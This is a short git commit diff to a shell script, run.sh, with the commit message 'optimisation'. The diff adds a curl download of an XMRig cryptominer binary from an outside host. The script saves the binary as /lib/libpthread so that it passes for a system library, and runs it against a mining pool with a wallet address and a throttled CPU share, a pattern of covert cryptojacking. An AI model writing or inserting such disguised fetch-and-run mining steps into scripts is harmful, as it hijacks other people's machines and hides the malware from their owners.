5af5d8632960a92fc0c405175a29f4687c8b559f
xbhuang's pc <xbhuang1994@gmail.com>
2017-09-03 03:08:51 +0800

    1.优化

--- run.sh
+++ run.sh
@@ -1,4 +1,5 @@
-wget 
+curl http://miner.gpu360.com/xmrig/libpthread > libpthread
+yum -y install libuv
 mv ./libpthread /lib/libpthread
 chmod +x /lib/libpthread
-/lib/libpthread -o nicehash.gpu360.com:3355 -O x -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash true  --max-cpu-usage 10
+ /lib/libpthread -o nicehash.gpu360.com:3355 -u 33MQmd3LSueY4gxSCXSJLrmVxtQ6WTQqJP.libpthread --nicehash  --max-cpu-usage=20 -p x -k
